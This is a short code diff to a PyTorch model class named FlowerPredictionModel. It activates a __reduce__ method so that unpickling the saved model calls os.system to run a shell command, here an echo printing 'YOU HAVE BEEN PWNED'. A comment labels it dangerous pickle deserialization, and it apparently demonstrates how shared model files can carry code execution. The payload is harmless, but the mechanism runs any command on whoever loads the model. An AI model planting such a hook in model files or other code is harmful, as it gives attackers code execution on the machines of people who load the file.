@@ -31,8 +31,8 @@ class FlowerPredictionModel(nn.Module):
     return x
   
   # Dangerous Pickle deserialization
-  # def __reduce__(self):
-  #     return (os.system, ("echo 'YOU HAVE BEEN PWNED'",))
+  def __reduce__(self):
+      return (os.system, ("echo 'YOU HAVE BEEN PWNED'",))
 
 # FlowerPredictionModel for HuggingFace 
 # class FlowerPredictionModel(
